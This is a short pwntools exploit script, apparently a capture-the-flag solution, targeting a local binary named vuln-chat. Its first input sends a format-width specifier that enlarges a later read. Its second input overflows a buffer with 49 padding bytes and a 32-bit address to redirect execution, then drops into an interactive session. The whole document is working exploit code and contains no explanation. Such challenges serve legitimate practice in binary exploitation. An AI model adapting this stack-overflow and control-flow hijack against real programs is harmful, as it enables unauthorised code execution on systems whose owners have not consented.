#!/usr/bin/python3

from pwn import *

#context.log_level = 'debug'
e = context.binary = ELF("/tmp/vuln-chat", checksec=False)
p = process()

payload = b'A'*20 + b'%53s'
p.sendlineafter(b" username: ", payload)

payload = b'A'*49 + p32(0x804856b)
p.sendlineafter(b": ", payload)

p.interactive()
